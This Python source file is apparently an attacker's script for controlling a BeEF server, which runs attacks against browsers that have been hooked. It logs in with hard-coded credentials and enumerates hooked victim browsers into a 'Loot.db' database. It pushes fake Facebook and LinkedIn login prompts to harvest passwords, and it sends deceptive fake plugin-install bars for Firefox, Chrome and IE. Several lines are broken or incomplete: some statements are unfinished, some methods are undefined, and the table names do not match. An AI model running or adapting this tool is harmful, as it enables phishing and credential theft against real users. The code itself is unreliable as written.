import sys, os, time, requests, signal, json, pprint, sqlite3
from collections import MutableMapping
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


class Browser_Parser:


	def __init__(self):
		self.dbName = "Loot.db"
		self.connex = sqlite3.connect(self.dbName)
		self.connex.text_factory = str
		self.cur = self.connex.cursor()
		self.uname = "beef"
		self.pword = "eaterGin308"
		self.cert_key = "/opt/beef/beef_key.pem"
		self.cert_cert = "/opt/beef/beef_cert.pem"
		self.browser_id = None
		self.cert = (self.cert_cert, self.cert_key)
		self.api_key = self.get_api_key()
		self.redirect_uri = None
		self.facebook_prompt_id = None
		self.user_id =  str(sys.argv[1:])


	def get_api_key(self):
		hed = "Content-Type: application/json"
		to_beef_serv = {'username' : self.uname, 'password' : self.pword}
		k_une = requests.post(url="https://192.168.3.1:3000/api/admin/login", cert=self.cert, verify=False, json=to_beef_serv)
		k_dict = json.loads(k_une.text)
		return k_dict['token']


	def initBrowserTable(self):
		try:
			query = 'CREATE TABLE IF NOT EXISTS TableA' \
					'(user_id TEXT NOT NULL,' \
					'hooked_browser_id TEXT UNIQUE NOT NULL,' \
					'browser_name TEXT NOT NULL,' \
					'browser_version TEXT NOT NULL,' \
					'os TEXT NOT NULL,' \
					'browser_plugins TEXT NOT NULL,'\
					'entered_login_yn TEXT NOT NULL,' \
					'clicked_toolbar_yn TEXT NOT NULL,' \
					'recent_redirect TEXT NOT NULL)'
			self.cur.execute(query)
			self.connex.commit()
		except sqlite3.Error as SQE:
			print("error inserting record:", SQE)
			pass


	def get_browser_deets(self, browser_metadata):
		urll = 'https://192.168.3.1:3000/api/hooks/' + str(self.browser_id) + "?token=" + str(self.api_key)
		k_une = requests.get(url=urll, cert=self.cert, verify=False)
		k_dict = json.loads(k_une.text)
		did_login = self.if_usr_login()
		did_click = self.if_usr_click()
		self.insert_into_BrowserTable(self.user_id, self.browser_id, k_dict['BrowserName'], k_dict['BrowserVersion'], k_dict['os'], k_dict['BrowserPlugins'], self.checkIfLoggedin, self.check.)


	def insert_into_BrowserTable(self, user_id, hooked_browser_id, browser_name, browser_version, os, browser_plugins, entered_login_yn, clicked_toolbar_yn, recent_redirect):
		try:
			print("adding to browser table...")
			self.cur.execute("INSERT or REPLACE INTO TableB VALUES (?,?,?,?,?,?,?,?,?)", [user_id, hooked_browser_id, browser_name, browser_version, os, browser_plugins, entered_login_yn, clicked_toolbar_yn, recent_redirect])
			self.connex.commit()
			print("successfully inserted records into browser table...")
		except sqlite3.Error as SQE:
			print("error inserting record:", SQE)
			pass	

	def promt_fake_login(self):
		#if self.facebook_prompt_id is None: ./RAP.sh st
		socnet_choice= str(input("toolbar to send:"))
		bars = ['facebook', 'linkedin', 'generic', 'twitter']
		if socnet_choice.lower() not in bars:
			print("please picka social network")
			return None
		elif socnet_choice.lower() == 'facebook':
			socnet_choice = 'Facebook'
		elif socnet_choice.lower() == 'linkedin':
			socnet_choice = 'LinkedIn'
		elif socnet_choice.lower() == 'youtube':
			socnet_choice = 'YouTube'
		elif socnet_choice.lower() == 'generic':
			socnet_choice = 'Generic'
		elif socnet_choice.lower() == 'youtube':
			socnet_choice = 'Youtube'
		hed = "Content-Type: application/json; charset=UTF-8"
		to_beef_serv = {'choice': socnet_choice }
		k_une = requests.post(url="https://192.168.3.1:3000/api/modules/" + str(self.browser_id) +"/242?token=" + str(self.api_key), cert=self.cert, verify=False, json=to_beef_serv)
		k_dict = json.loads(k_une.text)
		if k_dict['success'] == "true":
			print "successfully sent prompt..."
			print "command id:" + str(k_dict['command_id'])
			self.facebook_prompt_id = k_dict['command_id']
		else:
			print "prompt request unsucessful"
			return None

	def get_prompt_credentials(self, idee, account):
		dets = requests.get(url="https://192.168.3.1:3000/api/modules/" 
			+ str(self.browser_id) 
			+ "/242/" + str(idee) 
			+ "?token=" 
			+ str(self.api_key), cert = self.cert, verify=False)
		c_dict = json.loads(dets.text)
		try:
			pprint.pprint(c_dict)
			data = json.loads(c_dict['0']['data'])
			password = str(data['data']).split(":")[1]
			self.
			#send to password table with account as ususal
			print password
		except Error:
			print("did not get response yet")
			pass



	def fake_toolbar(self, redirect_url):
		toolbar_type = str(input("toolbar to send:"))
		bars = ['firefox', 'chrome', 'ie']
		if toolbar_type.lower() not in bars:
			print("please pick firefox, chrome or IE")
			return None
		elif toolbar_type.lower() == 'firefox':
			command_id = 252
			notification = "An additional plug-in is required to display some elements on this page."
		elif toolbar_type.lower() == 'chrome':
			command_id = 256
			notification = "Additional plugins are required to display all the media on this page."
		elif toolbar_type.lower() == 'ie':
			command_id = 263
			notification = "This website wants to run the following applet: 'Java' from 'Microsoft Inc'. To continue using this website you must accept the following security popup"
		hed = "Content-Type: application/json; charset=UTF-8"
		params= {"url" : redirect_url, 'notification_text' : notification}
		f_f = requests.post(url="https://192.168.3.1:3000/api/modules/" + str(self.browser_id) +"/" + str(command_id) + "?token=" + str(self.api_key), cert=self.cert, verify=False, json=params)
		f_f = json.loads(f_f.text)
		if f_f['success'] == "true":
			print "successfully sent prompt..."
			print "command id:" + str(f_f['command_id'])
			self.toolbar_prompt_id = f_f['command_id']
		else:
			print "prompt request unsucessful"
			return None

	def get_fake_toolbar_result(self):
		pass

	def which_browser(self):
		#looks up most recent browser ID, launches fake toolbar, records clicks
		pass

	def get_module_deets(self):
		#debug: helper to get details on modules, delete after use
		det = requests.get(url="https://192.168.3.1:3000/api/modules/263?token=" + str(self.api_key), cert=self.cert, verify=False)
		pprint.pprint(json.loads(det.text)) 
		# 242 --> pretty theft, 252 --> firefox fake notification, 256 --> chrome fake bar, 263 --> IE fake bar


	def check_toolbars(self):
		pass

	def check_lastpass(self):
		pass

	def check_popup_blocker(self):
		pass

	def check_adblock(self):
		pass

	def check_antivirus(self):
		pass


	def get_hooked_browsers(self):
		to_browser_table = {}
		urll = 'https://192.168.3.1:3000/api/hooks?token=' + str(self.api_key)
		k_une = requests.get(url=urll,  cert = self.cert, verify=False)
		k_dict = json.loads(k_une.text)
		if k_dict['hooked-browsers']['online']:
			print "found currently-hooked browser:"
			for key in k_dict['hooked-browsers']['online']['0']:
				if key == 'session':
					self.browser_id = k_dict['hooked-browsers']['online']['0']['session']
				elif key == 'page_uri':
					self.redirect_uri = k_dict['hooked-browsers']['online']['0']['page_uri']
				else:
					to_browser_table[str(key)] = str(k_dict['hooked-browsers']['online']['0'][key])
			print to_browser_table
			print "browser session id: " + str(self.browser_id)
			return to_browser_table
		else:
			print "no hooked browser found"




if __name__ == "__main__":
	bp = Browser_Parser()
	bp.get_api_key()
	md = bp.get_hooked_browsers()
	print(str(md))
	bp.get_module_deets()
	#bp.promt_fake_login("Facebook")
	#bp.get_prompt_credentials(85, "Facebook")
	bp.fake_firefox()
